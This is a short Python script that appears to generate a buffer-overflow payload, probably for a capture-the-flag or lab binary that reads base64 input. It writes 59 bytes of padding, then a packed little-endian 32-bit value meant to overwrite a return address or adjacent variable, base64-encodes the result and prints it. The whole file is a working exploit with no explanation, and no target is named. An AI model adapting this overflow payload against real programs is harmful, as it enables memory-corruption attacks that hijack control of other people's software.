
import sys
import struct
import base64

buf = b'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
buf += struct.pack('<I', 1775186268)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
